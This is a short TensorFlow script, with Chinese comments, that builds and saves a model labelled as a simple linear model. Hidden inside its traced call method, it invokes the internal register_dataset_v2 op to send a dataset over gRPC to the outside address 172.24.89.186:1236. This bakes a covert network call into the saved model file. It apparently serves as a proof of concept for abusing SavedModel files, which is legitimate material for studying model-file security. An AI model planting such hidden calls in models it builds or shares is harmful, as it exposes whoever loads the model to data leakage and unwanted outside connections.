import tensorflow as tf

class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)

    @tf.function
    def __call__(self, x):
        from tensorflow.python.ops.gen_experimental_dataset_ops import register_dataset, register_dataset_v2
        dataset = tf.data.Dataset.from_tensor_slices(['a', 'b', 'c', 'd', 'e', "f", "g", "h", "i"])
        tf.print(register_dataset_v2(dataset=dataset._variant_tensor, address="172.24.89.186:{}".format(1236), protocol="grpc", external_state_policy=0))
# 保存模型
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()

# 调用模型以收集追踪数据
result = model(tf.constant(5.0))

save_dir = 'RegisterDataset_get_content'
tf.saved_model.save(model, save_dir)
